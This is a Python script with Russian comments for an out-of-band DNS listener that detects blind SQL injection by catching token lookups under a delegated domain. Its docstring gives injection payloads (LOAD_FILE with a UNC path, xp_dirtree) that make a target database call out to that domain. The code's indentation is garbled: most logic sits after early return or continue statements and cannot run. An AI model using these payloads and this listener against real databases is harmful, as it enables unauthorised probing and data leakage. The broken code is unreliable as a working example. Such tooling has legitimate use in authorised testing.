#!/usr/bin/env python3
"""oob_dns_server.py — DNS-резолвер для OOB-детекта слепых SQLi.

Принцип (Burp Collaborator-стиль): делегируй поддомен (например
oob.yourdomain.com NS -> IP этой машины) у своего DNS-провайдера,
запусти этот скрипт — он отвечает на ЛЮБОЙ A-запрос в этой зоне.

Когда уязвимая СУБД выполняет пейлоад вида
 LOAD_FILE(CONCAT('\\\\',..., 'token.oob.yourdomain.com\\x'))
или EXEC xp_dirtree '\\token.oob.yourdomain.com\x' —
она резолвит token.oob.yourdomain.com, скриптер ловит запрос
и пишет token в oob_hits.json. Оркестратор затем проверяет хит.

Запуск: sudo python oob_dns_server.py --domain oob.yourdomain.com
(нужен порт 53, поэтому root или setcap cap_net_bind_service)
"""

import argparse
import json
import os
import socket
import struct
import threading
import time

HITS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
 "oob_hits.json")
_lock = threading.Lock()

def load_hits() -> dict:
 try:
     with open(HITS_FILE, encoding="utf-8") as fp:
         return json.load(fp)
 except Exception:
     return {}

def save_hit(token: str, src_ip: str):
 with _lock:
     hits = load_hits()
     hits[token] = {"ip": src_ip, "ts": time.time()}
     with open(HITS_FILE, "w", encoding="utf-8") as fp:
         json.dump(hits, fp, indent=2)
         print(f"[OOB HIT] token={token} from={src_ip}")

def parse_dns_query(data: bytes):
 """Минимальный парсер DNS: вернуть (транзакция_id, домен, тип)."""
 if len(data) < 12:
     return None, None, None
     tid = struct.unpack(">H", data[0:2])[0]
     qcount = struct.unpack(">H", data[4:6])[0]
     if qcount < 1:
         return tid, None, None
         pos = 12
         labels = []
         while pos < len(data):
             l = data[pos]
             if l == 0:
                 pos += 1
                 break
                 labels.append(data[pos + 1:pos + 1 + l].decode("ascii", "replace"))
                 pos += 1 + l
                 qtype = struct.unpack(">H", data[pos:pos + 2])[0] if pos + 2 <= len(data) else 0
                 return tid, ".".join(labels), qtype

def build_dns_response(tid: int, question: bytes, answer_ip: str) -> bytes:
 """Ответ A-записью на question (сырой вопрос уже в data)."""
 # заголовок: flags 0x8180 (QR=1, RD=1, RA=1), 1 вопрос, 1 ответ
 header = struct.pack(">HHHHHH", tid, 0x8180, 1, 1, 0, 0)
 rdata = socket.inet_aton(answer_ip)
 # имя ответа: указатель на имя вопроса (0xC00C)
 rr = struct.pack(">HHHIH", 0xC00C, 1, 1, 60, len(rdata)) + rdata
 return header + question + rr

def main():
 ap = argparse.ArgumentParser()
 ap.add_argument("--domain", required=True,
 help="Зона, например oob.yourdomain.com")
 ap.add_argument("--ip", default="10.0.0.1",
 help="IP, которым отвечаем на A-запросы")
 ap.add_argument("--port", type=int, default=53)
 args = ap.parse_args()

 zone = args.domain.rstrip(".").lower()
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.bind(("0.0.0.0", args.port))
 print(f"[*] OOB DNS-сервер: зона *.{zone}, порт {args.port}, "
 f"ответ A -> {args.ip}")
 print(f"[*] Хиты пишутся в {HITS_FILE}")

 while True:
     try:
         data, addr = sock.recvfrom(4096)
         tid, domain, qtype = parse_dns_query(data)
         if not domain:
             continue
             if not domain.lower().endswith(zone):
                 continue
                 # token = первая метка
                 token = domain.split(".")[0]
                 if token and len(token) >= 6:
                     save_hit(token, addr[0])
                     print(f" [>] {domain} (type {qtype}) от {addr[0]}")
                     # ответить A-записью (СУБД ждёт ответа)
                     if qtype == 1:
                         question = data[12:]
                         resp = build_dns_response(tid, question, args.ip)
                         sock.sendto(resp, addr)
 except KeyboardInterrupt:
     print("\n[*] Остановлено.")
     break
 except Exception as e:
     print(f"[!] Ошибка: {e}")

if __name__ == "__main__":
 main()